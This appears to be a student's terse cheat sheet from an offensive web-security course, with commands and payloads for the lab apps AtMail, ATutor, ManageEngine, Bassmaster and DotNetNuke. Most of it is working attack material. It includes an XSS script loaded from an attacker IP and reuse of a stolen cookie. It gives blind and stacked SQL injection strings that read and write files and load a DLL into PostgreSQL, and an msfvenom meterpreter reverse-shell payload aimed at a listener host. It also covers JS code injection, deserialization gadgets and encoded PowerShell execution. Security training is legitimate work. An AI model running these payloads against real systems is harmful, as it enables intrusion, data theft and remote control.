xfreerdp +nego +sec-rdp +sec-tls +sec-nla /d: /u: /p: /v:dnn /u:administrator /p:*** /size:1180x708
rdesktop -u Administrator -p *** manageengine -g 1180x708

tar -zcvf archive.tar.gz OffensiveSecurity/
tar -xzf archive.tar.gz


Make share:
sudo impacket-smbserver test .

Compile .NET:
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe test.cs

Compile Java:
    javac -source 1.8 -target 1.8 test.java
    jar cmvf META-INF/MANIFEST.MF test.jar test.class

Search task:   tasklist | findstr /i calc
Delete task:   taskkill /f /IM calc.exe

----------------------------------------------------------------------------------------------------
AtMail

Fuzz the webmail:
    xss-webmail-fuzzer.py -t admin@offsec.local -f attacker@offsec.local -s atmail -c plain -j onebyone_main -r 2

CSRF (force to send the email):
    python -m SimpleHTTPServer 9090
    atmail_sendemail.py atmail '<script src="http://192.168.119.123:9090/atmail_sendmail_XHR-final.js"></script>'
    open email, goto http://atmail/a/d/adminoffseclocal/--atmail.php

grep -rnw . -e "^.*tmpFolderBaseName*" --color
grep -rnw . -e "^.*function addattachment.*" --color
grep -rnw . -e "^.*function getTmpFolder.*" --color

Use stolen cookie, type in console: javascript:void(document.cookie="atmail6=1fp0fjq4aa8sm5if934b62ptv6");

select * from Config where keyName="tmpFolderBasename";
-----------------------------------------------------------------------------------------------------
ATutor

Check php version: php -v or echo "<?php echo 'PHP Version: ' . phpversion().\"\r\n\"; ?>" > /var/www/html/php_version.php; curl localhost/php_version.php

Enable logging in Apache and MySQL:
    sudo nano /etc/php5/apache2/php.ini , change ;display_errors = Off to display_errors = On
    sudo systemctl restart apache2

    sudo nano /etc/mysql/my.cnf , general_log_file = /var/log/mysql/mysql.log
			          general_log = 1
    sudo systemctl restart mysql

    tail -f /var/log/mysql/mysql.log



gedit sftp://atutor/var/www/html/ATutor/search.php

Not relevant but could be useful:
	find . -name \*.php | xargs grep '\$_\(GET\)' | less
	find . -name \*.php | xargs grep '\$_\(GET\|POST\|REQUEST\|COOKIE\)' | less

pages with no auth: $_user_location = 'public';
grep -rnw /var/www/html/ATutor -e "^.*user_location.*public.*" --color
grep -rnw /var/www/html/ATutor -e "function searchFriends" --color
grep -rnw /var/www/html/ATutor -e "function queryDB" --color
egrep '\$addslashes.*=.*' /var/www/html/ATutor/ -r --color
egrep -r "define\('MYSQLI_ENABLED" /var/www/html/ATutor/ --color

http://atutor/ATutor/mods/_standard/social/index_public.php?q='

To test function on the target host: echo "<?php var_dump(get_magic_quotes_gpc()); ?>" > /var/www/html/magic.php
				     curl localhost/magic.php

Boolean Blind SQLi:
    mysql -u root -p

    /**/ to be used to substitute " " space due to it's used for names separation in query parsing

    True: AAAA')/**/or/**/(select/**/1)=1%23
    False: AAAA')/**/or/**/(select/**/1)=0%23

    Content length of python atutor-sqli.py atutor "AAAA')/**/or/**/(select/**/1)=1%23" of bigger then "AAAA')/**/or/**/(select/**/1)=0%23"

    select/**/version();
    Is the 1 char of version eq 5: select/**/(substring((select/**/version()),1,1))='5';
    Same with ascii:    select/**/ascii(substring((select/**/version()),1,1))=53;
    Query string injection:   q=test%27)/**/or/**/(select/**/ascii(substring((select/**/version()),1,1)))=53%23

File upload:

    Pass array instead of string to disclose internal path: http://atutor/ATutor/browse.php?access=&search[]=test&include=all&filter=Filter
    Search for writable dirs find /var/www/html/ -type d -perm -o+w

Loose == comparisons when reviewing PHP apps:
  Could the 0eDDDDDDD (where D any digits) be supplied as the user input?
  Could it be compared to 0? (php -a ... echo md5('240610708'); var_dump('0e462097431906509019562988736854' == '0');)
-----------------------------------------------------------------------------------------------------
ManageEngine:

Java web config:
    WEB-INF/web.xml
    <servlet> or <servlet-mapping> to check mapping servlets to java classes

Search for regexp in java sources:
    ^.*?query.*?select.*?
    doGet  - looking for things like    doGet(request, response);
	or doGet(HttpServletRequest req, HttpServletResponse resp)
    • doPost • doPut • doDelete • doCopy • doOptions

Enable PostgreSQL logging:
    in the ...\pgsql\data\amdb\postgresql.conf set:    log_statement
    then restart the ManageEngine application service
    logs are in ...\pgsql\data\amdb\pgsql_log

Typical PostgreSQL query: select version()    -client is psql.exe -p 15432 -U postgres amdb

Poweshell foo with logs:
    dir | sort LastWriteTime | select -last 1   -last changed file
    Get-Content .\postgresql_12.log -wait -tail 1 | Select-String -Pattern "version"

    Check for smth containing words resourseid or syntax error:
    Get-Content .\postgresql_13.log -wait -tail 100 | Select-String -Pattern "(resourceid( >|\))|syntax error)"
		  log -tail 100 | Select-String -Pattern error -context 0,2    -show 2 lines after the error

SQL injection:
    Sleep 10:   /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;select+pg_sleep(10);
    Sleep 10 if db user is superuser: &userId=1;SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+
    Read file, sleep 10 if 1 leteer is "a": userId=1;create+temp+table+awae+(content+text);copy+awae+from+$$c:\awae.txt$$;select+case+when(ascii(substr((select+content+from+awae),1,1))=97)+then+pg_sleep(10)+end;--+
    Write file: userId=1;COPY+(SELECT+$$blablatext$$)+to+$$c:\\offsec.txt$$;--+
	Encode payload with both base64 and URL: copy (select convert_from(decode($$ENCODED_PAYLOAD$$,$$base64$$),$$utf-8$$)) to $$C:\\Program+Files+(x86)\\ManageEngine\\wmiget.vbs$$;

Encoding problems of ':
    In MySql / MariaDB could be bypassed with hexidecimal repres:  select concat('1337',' h@x0r') is the same with  select concat(0x31333337,0x206840783072)
    In Postgres could be done via CHR  CREATE TABLE AWAE (offsec text); INSERT INTO AWAE(offsec) VALUES (CHR(65)||CHR(87)||CHR(65)||CHR(69));
		or $$ tag CREATE TEMP TABLE AWAE(offsec text);INSERT INTO AWAE(offsec) VALUES ($$test$$);COPY AWAE(offsec) TO $$C:\test.txt$$;


     msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.119.123 LPORT=4444 -e x86/shikata_ga_nai -f vbs
Regexps to make oneliner:
    '.*
     _.*?\n
    \t
    \n relplace with :
    \r\n relace with : (if pasted from linux)
    :: replace with :

Posgresql loading external dll:
    in database \df test to check if the module already exist
    create or replace function test(text, integer) returns void as $$C:\awae.dll$$,$$awae$$ language C strict;
    SELECT test($$calc.exe$$, 3);
    DROP FUNCTION test(text, integer);

Posgresql loading large objects (requires DBA perms):
    select lo_import('C:\\Windows\\win.ini', 1337);
    select loid, pageno, encode(data, 'escape') from pg_largeobject;
    update pg_largeobject set data=decode('77303074', 'hex') where loid=1337 and pageno=0;
    select lo_export(1337, 'C:\\new_win.ini');
    \lo_unlink 1337

    Bin to hex one line: xxd rev_shell.dll | cut -d" " -f 2-9 | sed 's/ //g' | tr -d '\n' > 123.txt


-------------------------------------------------------------------------------------------------------
Bassmaster

Look for eval in JS source code:      grep -rnw "eval(" . --color

Trace back to the user request. What sanitization is used? Regexp https://regex101.com/

JS code injection (visible on the server):      /item/$1.id;require('util').log('CODE_EXECUTION');
Print the value on the server:        console.log('Executing: ' + parts[i].value);

In case of problems with symbols, hex encoding: cmd = "\\\\x2fbin\\\\x2fbash"


-------------------------------------------------------------------------------------------------
DotNetNuke

In case serialization object type is not hardcoded or sanitized, other class could be called during deserialization. Example:

XmlSerializer xmlSerializer = new XmlSerializer(Type.GetType(attribute2));

dnSpy

To bypass anti debugging protections:
	Right click on the loaded project - Edit Assembly Attributes
	Change the line: [assembly:
Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
	To: [assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)]
	Then click compile, then File - Save Module - Ok
	Restart IIS iisreset /noforce

To attach to running .Net / IIS app:
	Debug - Attach to Process (w3wp.exe)
	Debug - Break all
	Debug - Windows - Modules
	Right Click on any module - Open all modules
	Debug - Continue
Edit - Search Assemblies - Search For - Method - PullFile

Is case of runtime error: Locals - innerException - message

Vuln cookie: DNNPersonalization
FileSystemUtils PullFile Method can download files
But XmlSerializer can not serialize class methods.  It can only serialize public properties and fields.
ObjectDataProvider class is gadget as we can wrap another object in it (p 244)
But XmlSerializer have no knowledge of the object type that is wrapped in the ObjectDataProvider instance, which in our case is a FileSystemUtils (p 255)
ExpandedWrapper class allow to specify the object types of the objects that are encapsulated in a given instance

tail -f /var/log/apache2/access.log

iconv -f ASCII -t UTF-16LE powershellcmd.txt | base64 | tr -d "\n"
powershell.exe -EncodedCommand bla
